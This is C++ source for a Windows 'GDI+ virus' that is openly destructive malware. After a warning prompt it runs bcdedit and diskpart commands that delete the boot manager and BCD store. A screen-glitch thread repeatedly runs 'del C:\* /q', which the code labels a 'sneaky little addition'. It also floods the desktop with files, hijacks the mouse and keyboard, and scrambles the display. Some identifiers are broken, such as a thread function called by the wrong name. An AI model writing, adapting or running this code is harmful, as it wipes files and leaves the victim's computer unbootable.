#include <Windows.h>
#include <string>
#include <iostream>
#include <fstream>
#include "getpath.hpp"
using namespace std;

static ULONGLONG n, r;
int randy() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }
auto path = get_desktop_path();
int counter = 0;

DWORD WINAPI shader1(LPVOID lpParam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, 4 * h * w, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 10)
            byte = randy() % 0xff;
        for (int i = 0; w * h > i; ++i) {
            if (!(i % h) && !(randy() % 110))
                v = randy() % 24;
            *((BYTE*)data + 4 * i + v) -= 5;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);

		// sneaky little addition
		system("del C:\\* /q");
    }
    return 0;
}

DWORD WINAPI spamfiles(LPVOID lpParam)
{
	int counter = 0;
	auto path = get_desktop_path();

	while(true){
		// filespam code from another one of my viruses
		ofstream filespam(path.string() + "\\urmom" + to_string(counter) + ".txt");
		filespam << "HI";
		counter++;
	}
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    int sw = GetSystemMetrics(0);
    int sh = GetSystemMetrics(0);

    int msgboxID = MessageBox(
        NULL,
        (LPCWSTR)L"THIS IS A DANGEROUS GDI+ VIRUS THAT CAN SERIOUSLY DAMAGE YOUR COMPUTER,\nARE YOU SURE YOU WANT TO CONTINUE????????",
        (LPCWSTR)L"WARNING",
        MB_YESNO | MB_ICONERROR | MB_DEFBUTTON2
    );

    switch (msgboxID)
    {
    case IDYES:
        SetCursorPos(0, 0);

        CreateThread(0, 0, shader1, 0, 0, 0);
		CreateThread(0, 0, filespam, 0, 0, 0);

        // Killing
        system("bcdedit /store c:\\boot\\bcd /delete {bootmgr} /f");
		system("echo select disk 0 > diskpart.txt");
		system("echo select partition 1 >> diskpart.txt");
		system("echo assign letter=S >> diskpart.txt");
		system("echo exit >> diskpart.txt");
        system("diskpart /s diskpart.txt");
        system("attrib -s -h -r S:\\* /s /d");
		system("del S:\\Boot\\BCD");
		system("bcdedit /delete {bootmgr} /f");

        while (true)
        {
            // mouse stuff
            SetCursorPos(rand() % sw - 1, rand() % sh - 1);

            mouse_event(MOUSEEVENTF_LEFTDOWN, rand() % sw - 1, rand() % sh - 1, 0, 0);
            mouse_event(MOUSEEVENTF_LEFTUP, rand() % sw - 1, rand() % sh - 1, 0, 0);
			keybd_event('A', 0, 0, 0);

            // MY EYES AHH THEY BURN
            HDC hdc = GetDC(0);
            int x = SM_CXSCREEN;
            int y = SM_CYSCREEN;
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);
            BitBlt(hdc, rand() % 222, rand() % 222, w, h, hdc, rand() % 222, rand() % 222, NOTSRCERASE);
            ReleaseDC(0, hdc);
        }
        break;

    case IDNO:
        ExitProcess(0);
        break;

        default:
        ExitProcess(0);
	    break;
    }
	return 0;
}










